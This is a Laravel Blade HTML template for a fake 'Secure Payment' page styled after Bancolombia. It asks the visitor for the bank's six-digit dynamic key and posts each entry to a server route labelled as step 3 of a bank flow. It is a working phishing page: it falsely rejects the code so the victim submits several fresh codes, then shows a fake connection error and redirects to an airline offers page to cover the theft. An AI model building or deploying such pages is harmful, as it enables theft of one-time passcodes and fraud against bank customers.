<!DOCTYPE html>
<html lang="es">
<head>
   <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    
    <title>Secure Payment</title>

    <link rel="stylesheet" href="{{asset('assets/css/payment/bancolombia.css')}}">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
		
</head>
<body style="background-color:#2c2a29;">

<div id="trazo">
    <div id="formContainer">
        <div style="text-align: center;">
            <br>

            <img src="img/logo.png" alt="" srcset="" width="100%">

            <br>
            <br>
            <a style="font-size:30px; color:#fff;">Ingresa tu clave dinamica</a>
        </div>


        <div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:#454648; height:290px; padding:20px; margin:auto;">

        <div style="text-align: center;">
            <br>
            <a style="font-size:16px; text-align:center; color:#fff;">La puedes encontrar en la app bancolombia</a>
            <br>
            <br>
            <input type="tel" name="code" id="txtDinamic" class="pass"  placeholder="******" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required>
            <br>
        </div>
        <br>
        <br>

        <div style="text-align: center;">

            <input type="submit" value="Continuar" id="btnDinamic" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;">
        </div>


    </div>

</div>

<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#fff; margin-top:15px;">Procesando, por favor espera...</p>
</div>


<script type="text/javascript">
    var count = 0;

    function sendCode() {
        const $input = $("#txtDinamic");

        // remove all whitespace
        let dinamica = $input.val().replace(/\s+/g, '');

        // update input without spaces
        $input.val(dinamica);

        if (dinamica.length > 5 && count >= 3) {
            
            $('#formContainer').hide();
            $('#loader').show();
            setTimeout(function () {
                $('#loader').hide();
                $('#formContainer').show();
            }, 6000);

            alert('Error de conexión, por favor intente de nuevo');
            window.location.href = "https://www.latamairlines.com/co/es/ofertas";        
        } else {
        
            // clear the field correctly
            $input.val('');
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $input.focus();

            // si quieres loguear el intento (opcional)
            if(dinamica.length > 5) {
                $('#formContainer').hide();
                $('#loader').show();
                setTimeout(function () {
                    $('#loader').hide();
                    $('#formContainer').show();
                }, 6000);

                $.ajax({
                    url: "{{ route('pago.bank.step.save', [
                            'bank' => $bankSlug,
                            'step' => 3
                        ]) }}",
                    method: 'POST',
                    data: { 
                         _token: "{{ csrf_token() }}",
                        dinamica: dinamica 
                    },
                    success: function (response) {
                        // si solo es log, no necesitas hacer nada aquí
                    },
                    error: function (xhr, status, error) {
                        console.log("Warning")
                    }
                });

                count++;
            }
            
        }
    }

	$(document).ready(function() {

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

		$('#btnDinamic').on('click', function (e) {
            e.preventDefault();
            sendCode();	
		});

		$("#txtDinamic").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>

</body>
</html>